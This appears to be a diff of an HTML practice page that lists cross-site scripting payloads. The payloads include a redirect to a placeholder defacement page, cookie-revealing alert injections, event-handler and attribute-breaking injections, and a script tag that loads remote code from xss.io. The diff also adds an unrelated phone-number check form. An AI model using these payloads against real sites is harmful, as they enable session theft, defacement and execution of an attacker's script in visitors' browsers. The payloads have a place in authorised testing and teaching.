@@ -13,13 +13,30 @@
 <script>window.location = "（你的黑页地址）";</script>
 <img src="javascript:alert('XSS')">
 <script>alert(document.cookie)</script>
-<script>alert(document.cookie)</script>
-"+alert('XSS')+"
 <script src="http://xss.io/a.js"></script>
 <div onclick="alert('xss')">
     <div onmouseenter="alert('xss')">
         "onclick="alert(document.cookie)
     </div>
 </div>
+
+
+<form id="test">
+    <input type="text" id="tel"/>
+    <input tpye="button" value="CheckTel" onclick="checkTel()" >
+</form>
+<script type="text/javascript">
+    function checkTel() {
+        var re = /^020-\d{8}$/;
+        if (re.test(document.getElementById('tel').value)) {
+            alert('电话正确！')
+        }else
+        {
+            alert('电话错误！')
+        }
+    }
+</script>
+
+
 </body>
 </html>
